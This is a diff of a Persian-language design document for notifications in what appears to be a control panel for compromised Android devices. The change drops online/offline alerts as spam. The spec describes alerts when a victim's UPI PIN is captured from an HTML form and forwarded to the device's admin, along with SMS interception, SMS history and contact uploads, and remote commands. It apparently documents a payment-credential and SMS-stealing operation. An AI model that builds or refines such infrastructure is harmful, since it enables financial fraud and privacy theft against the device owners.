@@ -10,6 +10,8 @@
 
 ### 📱 انواع Notification:
 
+**توجه:** Online/Offline لاگ نمی‌شه چون heartbeat هر 3 دقیقه میاد و خیلی spam می‌شه! ❌
+
 #### ✅ Device Registration
 ```
 🆕 New Device Registered
@@ -33,32 +35,6 @@
 **شرایط ارسال:**
 - زمانی که UPI PIN از HTML form دریافت بشه
 - فقط به ادمین صاحب دستگاه
-
----
-
-#### 🟢 Device Online
-```
-🟢 Device Online
-📱 Device ID: DEVICE_123
-⏰ Last seen: 2 minutes ago
-```
-
-**شرایط ارسال:**
-- زمانی که دستگاه آفلاین بود و الان آنلاین شد
-- نه برای هر heartbeat! (خیلی spam می‌شه)
-
----
-
-#### 🔴 Device Offline
-```
-🔴 Device Offline
-📱 Device ID: DEVICE_123
-⚠️ No heartbeat for 6 minutes
-```
-
-**شرایط ارسال:**
-- زمانی که دستگاه بیشتر از 6 دقیقه heartbeat نفرستاده
-- یکبار در ساعت maximum (جلوگیری از spam)
 
 ---
 
@@ -371,12 +347,13 @@ Changes:
 
 ### ❌ Spam Prevention
 
-1. **Heartbeat ها** - هر 3 دقیقه می‌آد، خیلی spam می‌شه
-2. **Battery Updates** - مگه اینکه critical باشه (<10%)
-3. **Ping Responses** - داخلی است
-4. **SMS History Uploads** - فقط تعداد کل
-5. **Contact Uploads** - فقط تعداد کل
-6. **Admin Activities برای Viewer ها** - فقط اعمال مهم
+1. **Heartbeat ها** - هر 3 دقیقه می‌آد، خیلی spam می‌شه ❌ هرگز لاگ نمی‌شه
+2. **Device Online/Offline** - خیلی زیاد تغییر می‌کنه ❌ هرگز لاگ نمی‌شه
+3. **Battery Updates** - مگه اینکه critical باشه (<10%)
+4. **Ping Responses** - داخلی است
+5. **SMS History Uploads** - فقط تعداد کل
+6. **Contact Uploads** - فقط تعداد کل
+7. **Admin Activities برای Viewer ها** - فقط اعمال مهم
 
 ---
 
@@ -386,7 +363,6 @@ Changes:
 |-------|-------|-------|-------|-------|-------|
 | Device Register | ✅ | ❌ | ❌ | ❌ | ❌ |
 | UPI Detected | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Device Online/Offline | ✅ | ❌ | ❌ | ❌ | ❌ |
 | New SMS Received | ❌ | ✅ | ❌ | ❌ | ❌ |
 | SMS Send Failed | ❌ | ✅ | ❌ | ❌ | ❌ |
 | Command Sent | ❌ | ❌ | ✅ | ❌ | ❌ |
